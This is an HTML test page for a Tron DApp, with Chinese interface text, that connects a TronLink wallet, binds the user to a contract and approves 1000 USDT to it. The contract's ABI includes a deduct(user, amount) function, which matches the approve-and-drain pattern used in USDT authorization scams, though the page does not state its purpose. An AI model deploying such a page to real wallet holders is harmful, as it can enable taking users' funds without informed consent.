<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tron DApp 测试</title>
</head>
<body>
  <h2>Tron 合约测试页面</h2>

  <button onclick="connectWallet()">连接钱包</button>
  <p id="address"></p>

  <hr>

  <button onclick="bind()">绑定用户 (bind)</button>

  <hr>

  <h3>授权 USDT 给合约</h3>
  <button onclick="approve1000USDT()">授权 1000 USDT</button>

  <p id="status"></p>

  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
  <script>
    const CONTRACT_ADDRESS = "TRZvddUZXAoriYEdrzVdMjcpF6VVVwQAis";
    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const ABI = [
      {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
      },
      {
        "anonymous": false,
        "inputs": [
          {
            "indexed": true,
            "internalType": "address",
            "name": "user",
            "type": "address"
          }
        ],
        "name": "Bound",
        "type": "event"
      },
      {
        "anonymous": false,
        "inputs": [
          {
            "indexed": true,
            "internalType": "address",
            "name": "user",
            "type": "address"
          },
          {
            "indexed": false,
            "internalType": "uint256",
            "name": "amount",
            "type": "uint256"
          }
        ],
        "name": "Deducted",
        "type": "event"
      },
      {
        "inputs": [],
        "name": "USDT",
        "outputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "bind",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "address",
            "name": "user",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "amount",
            "type": "uint256"
          }
        ],
        "name": "deduct",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "getContractBalance",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "address",
            "name": "user",
            "type": "address"
          }
        ],
        "name": "getUserBalance",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "isBound",
        "outputs": [
          {
            "internalType": "bool",
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "owner",
        "outputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      }
    ];

    let tronWeb;
    let contract;

    function setStatus(msg) {
      document.getElementById("status").innerText = msg;
    }

    async function connectWallet() {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        tronWeb = window.tronWeb;
        document.getElementById("address").innerText =
          "钱包地址: " + tronWeb.defaultAddress.base58;
        contract = await tronWeb.contract(ABI, CONTRACT_ADDRESS);
        setStatus("钱包已连接");
      } else {
        alert("请安装 TronLink 钱包并解锁");
      }
    }

    async function bind() {
      try {
        const tx = await contract.bind().send();
        setStatus("绑定成功: " + tx);
      } catch (e) {
        setStatus("绑定失败: " + e.message);
      }
    }

    async function approve1000USDT() {
      try {
        const fixedAmount = 1000; // 固定授权 1000 USDT
        const usdt = await tronWeb.contract().at(USDT_ADDRESS);

        const tx = await usdt
          .approve(CONTRACT_ADDRESS, fixedAmount * 1e6)
          .send();

        setStatus("授权成功: " + tx + " （固定 1000 USDT）");
      } catch (e) {
        setStatus("授权失败: " + e.message);
      }
    }
  </script>
</body>
</html>
